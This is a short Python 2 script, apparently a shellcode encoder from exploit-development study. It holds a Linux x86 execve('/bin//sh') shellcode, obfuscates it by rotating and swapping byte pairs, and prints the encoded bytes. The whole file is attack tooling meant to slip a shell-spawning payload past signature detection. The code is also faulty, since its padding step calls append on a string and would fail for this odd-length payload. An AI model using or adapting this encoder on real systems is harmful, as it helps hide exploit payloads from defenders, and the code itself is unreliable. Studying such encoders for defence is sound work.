#!/usr/bin/env python
# -*- coding: utf-8 -*- 
__author__ = 'Lucas Kauffman'

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

def rol(byte, count):
    while count > 0:
        byte = (byte << 1 | byte >> 7) & 0xFF
        count -= 1
    return byte

def ror(byte, count):
    while count > 0:
        byte = (byte >> 1 | byte << 7) & 0xFF
        count -= 1
    return byte

if len(bytearray(shellcode))%2==1: 	
	shellcode.append(0x90) 

iterator = iter(bytearray(shellcode))	
encodedShellcode = list()

boolean = True

while boolean:
	try: 
		byte1 = iterator.next()
		byte1 = ror(byte1,4)
		byte2 = iterator.next()
		byte2 = rol(byte2,2)
		encodedShellcode.append(byte2)	
		encodedShellcode.append(byte1)
	except:
		boolean = False



encodedShellcode2 = list()

for byte in encodedShellcode:
	encodedShellcode2.append('0x'+'%x'%byte)
	encodedShellcode2.append(',')
encodedShellcode2[-1]=''
print ''.join(encodedShellcode2)
